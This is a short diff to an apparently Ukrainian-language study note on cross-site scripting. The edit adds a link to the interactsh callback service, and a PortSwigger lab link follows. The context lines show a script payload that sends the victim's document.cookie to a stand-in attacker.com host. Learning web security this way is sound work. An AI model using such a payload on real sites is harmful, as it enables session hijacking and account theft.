@@ -21,7 +21,7 @@
      ```html
      <script>new Image().src="http://attacker.com/log?c="+document.cookie</script>
      ```
-   - Результат - отримані cookie у себе на webhook.
+   - Результат - отримані cookie у себе на webhook. [interactsh](https://app.interactsh.com/#/)
 
 #### 🧪 PortSwigger Labs:
 - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
